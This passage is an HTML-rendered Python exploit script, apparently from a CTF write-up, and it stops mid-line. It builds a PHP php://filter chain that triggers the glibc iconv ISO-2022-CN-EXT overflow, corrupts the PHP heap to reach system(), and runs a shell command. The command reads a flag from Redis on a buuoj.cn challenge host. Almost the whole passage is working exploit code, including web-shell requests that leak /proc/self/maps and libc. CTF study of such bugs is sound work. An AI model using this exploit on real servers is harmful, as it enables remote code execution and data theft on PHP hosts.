class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    start: <span class="built_in">int</span></span><br><span class="line">    stop: <span class="built_in">int</span></span><br><span class="line">    permissions: <span class="built_in">str</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.stop - <span class="variable language_">self</span>.start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_hex</span>(<span class="params">data</span>):</span><br><span class="line">    hex_string = binascii.hexlify(data).decode()</span><br><span class="line">    <span class="built_in">print</span>(hex_string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span></span><br><span class="line"><span class="string">    chunked representation has size `size`.</span></span><br><span class="line"><span class="string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span></span><br><span class="line">    <span class="comment"># enough</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span></span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Remove 2-byte header and 4-byte checksum</span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size</span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))</span><br><span class="line">    bucket = qpe(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = compressed_bucket(bucket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bucket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    payload = base64.b64encode(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">regions, *names</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> region <span class="keyword">in</span> regions:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">regions</span>):</span><br><span class="line">    <span class="comment"># Any anonymous RW region with a size superior to the base heap size is a</span></span><br><span class="line">    <span class="comment"># candidate. The heap is at the bottom of the region.</span></span><br><span class="line">    heaps = [</span><br><span class="line">        region.stop - HEAP_SIZE + <span class="number">0x40</span></span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)</span><br><span class="line">        <span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span></span><br><span class="line">        <span class="keyword">and</span> region.size &gt;= HEAP_SIZE</span><br><span class="line">        <span class="keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line">        <span class="keyword">and</span> region.path == <span class="string">&quot;&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> heaps:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    first = heaps[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:</span><br><span class="line">        heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Potential heaps: &quot;</span> + heaps + <span class="string">&quot; (using first)&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(&quot;[*]Using &quot; + hex(first) + &quot; as heap&quot;)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_regions</span>(<span class="params">maps_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;maps&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    maps = f.read().decode()</span><br><span class="line">    PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">        <span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span></span><br><span class="line">    )</span><br><span class="line">    regions = []</span><br><span class="line">    <span class="keyword">for</span> region <span class="keyword">in</span> maps.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="comment"># print(region)</span></span><br><span class="line">        <span class="keyword">match</span> = PATTERN.<span class="keyword">match</span>(region)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">            stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">            permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)</span><br><span class="line">            path = <span class="keyword">match</span>.group(<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">                path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                path = <span class="string">&quot;&quot;</span></span><br><span class="line">            current = Region(start, stop, permissions, path)</span><br><span class="line">            regions.append(current)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(&quot;[*]Unable to parse memory mappings&quot;)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&quot;[*]Got &quot; + str(len(regions)) + &quot; memory regions&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> regions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>(<span class="params">regions</span>):</span><br><span class="line">    <span class="comment"># PHP&#x27;s heap</span></span><br><span class="line">    heap = find_main_heap(regions)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Libc</span></span><br><span class="line">    libc_info = _get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap, libc_info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit_path</span>(<span class="params">libc, heap, sleep, padding, cmd</span>):</span><br><span class="line">    LIBC = libc</span><br><span class="line">    ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]</span><br><span class="line">    ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]</span><br><span class="line">    ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">    ADDR_HEAP = heap</span><br><span class="line">    ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span></span><br><span class="line">    ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span></span><br><span class="line"></span><br><span class="line">    ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    CS = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pad needs to stay at size 0x100 at every step</span></span><br><span class="line">    pad_size = CS - <span class="number">0x18</span></span><br><span class="line">    pad = <span class="string">b&quot;\x00&quot;</span> * pad_size</span><br><span class="line">    pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">    pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">    pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">    pad = compressed_bucket(pad)</span><br><span class="line"></span><br><span class="line">    step1_size = <span class="number">1</span></span><br><span class="line">    step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size</span><br><span class="line">    step1 = chunked_chunk(step1)</span><br><span class="line">    step1 = chunked_chunk(step1)</span><br><span class="line">    step1 = chunked_chunk(step1, CS)</span><br><span class="line">    step1 = compressed_bucket(step1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span></span><br><span class="line">    <span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span></span><br><span class="line"></span><br><span class="line">    step2_size = <span class="number">0x48</span></span><br><span class="line">    step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)</span><br><span class="line">    step2 = chunked_chunk(step2, CS)</span><br><span class="line">    step2 = chunked_chunk(step2)</span><br><span class="line">    step2 = compressed_bucket(step2)</span><br><span class="line"></span><br><span class="line">    step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)</span><br><span class="line">    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)</span><br><span class="line">    step2_write_ptr = chunked_chunk(step2_write_ptr)</span><br><span class="line">    step2_write_ptr = compressed_bucket(step2_write_ptr)</span><br><span class="line"></span><br><span class="line">    step3_size = CS</span><br><span class="line"></span><br><span class="line">    step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS</span><br><span class="line">    step3 = chunked_chunk(step3)</span><br><span class="line">    step3 = chunked_chunk(step3)</span><br><span class="line">    step3 = chunked_chunk(step3)</span><br><span class="line">    step3 = compressed_bucket(step3)</span><br><span class="line"></span><br><span class="line">    step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS</span><br><span class="line">    step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">    step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">    step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">    step3_overflow = compressed_bucket(step3_overflow)</span><br><span class="line"></span><br><span class="line">    step4_size = CS</span><br><span class="line">    step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)</span><br><span class="line">    step4 = chunked_chunk(step4)</span><br><span class="line">    step4 = chunked_chunk(step4)</span><br><span class="line">    step4 = chunked_chunk(step4)</span><br><span class="line">    step4 = compressed_bucket(step4)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span></span><br><span class="line">    <span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span></span><br><span class="line">    step4_pwn = ptr_bucket(</span><br><span class="line">        <span class="number">0x200000</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="comment"># free_slot</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        ADDR_HEAP,  <span class="comment"># 0x140</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        size=CS,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    step4_custom_heap = ptr_bucket(</span><br><span class="line">        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    step4_use_custom_heap_size = <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">    COMMAND = cmd</span><br><span class="line">    COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> sleep:</span><br><span class="line">        COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">    COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> (</span><br><span class="line">            <span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size</span><br><span class="line">    ), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span></span><br><span class="line">    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    step4_use_custom_heap = COMMAND</span><br><span class="line">    step4_use_custom_heap = qpe(step4_use_custom_heap)</span><br><span class="line">    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)</span><br><span class="line">    pages = (</span><br><span class="line">            step4 * <span class="number">3</span></span><br><span class="line">            + step4_pwn</span><br><span class="line">            + step4_custom_heap</span><br><span class="line">            + step4_use_custom_heap</span><br><span class="line">            + step3_overflow</span><br><span class="line">            + pad * padding</span><br><span class="line">            + step1 * <span class="number">3</span></span><br><span class="line">            + step2_write_ptr</span><br><span class="line">            + step2 * <span class="number">2</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    resource = compress(compress(pages))</span><br><span class="line">    resource = b64(resource)</span><br><span class="line">    resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    filters = [</span><br><span class="line">        <span class="comment"># Create buckets</span></span><br><span class="line">        <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 0: Setup heap</span></span><br><span class="line">        <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 1: Reverse FL order</span></span><br><span class="line">        <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 2: Put fake pointer and make FL order back to normal</span></span><br><span class="line">        <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 3: Trigger overflow</span></span><br><span class="line">        <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span></span><br><span class="line">        <span class="string">&quot;convert.quoted-printable-decode&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    filters = <span class="string">&quot;|&quot;</span>.join(filters)</span><br><span class="line">    path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span></span><br><span class="line">    path = path.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;%2b&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------- 简化版主函数 --------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    ip = <span class="string">&quot;cd75b1b6-18d7-4482-911c-43be6f8dbeab.node5.buuoj.cn&quot;</span></span><br><span class="line">    port = <span class="string">&quot;81&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/&quot;</span></span><br><span class="line"></span><br><span class="line">    maps = base64.b64decode(requests.get(</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?shell=?%3E%3C?php%20$context%20=%20new%20SplFileObject(%27php://filter/convert.base64-encode/resource=/proc/self/maps%27);foreach($context%20as%20$f)&#123;&#123;echo($f);&#125;&#125;&quot;</span></span><br><span class="line">    ).text)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&quot;maps&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(maps)</span><br><span class="line"></span><br><span class="line">    libc = base64.b64decode(requests.get(</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?shell=?%3E%3C?php%20$context%20=%20new%20SplFileObject(%27php://filter/convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so%27);foreach($context%20as%20$f)&#123;&#123;echo($f);&#125;&#125;&quot;</span></span><br><span class="line">    ).text)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&quot;libc-2.23.so&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(libc)</span><br><span class="line"></span><br><span class="line">    regions = get_regions(<span class="string">&quot;maps&quot;</span>)</span><br><span class="line">    heap, libc_info = get_symbols_and_addresses(regions)</span><br><span class="line">    libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc.address = libc_info.start</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&quot;(echo \&quot;auth admin123\nkeys *\nget flag\&quot; | redis-cli) &gt; /tmp/1.txt&quot;</span></span><br><span class="line">    payload = build_exploit_path(libc, heap, sleep=<span class="number">1</span>, padding=<span class="number">20</span>, cmd=cmd)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?shell=?%3E%3C?php%20$context=new%20SplFileObject(%27<span class="subst">&#123;payload&#125;</span>%27);foreach($context%20as%20$f)&#123;&#123;echo($f);&#125;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    result = requests.get(<span class="string">f&quot;<span 